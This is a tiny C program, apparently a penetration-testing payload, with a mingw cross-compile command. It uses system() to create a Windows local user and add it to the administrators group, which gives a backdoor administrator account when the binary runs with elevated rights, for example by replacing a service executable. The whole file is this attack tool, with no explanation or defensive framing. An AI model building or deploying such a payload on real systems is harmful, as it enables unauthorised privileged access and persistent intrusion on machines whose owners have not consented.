#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;
}

/*  Compile
 i686-w64-mingw32-gcc -o useradd.exe useradd.c
 */
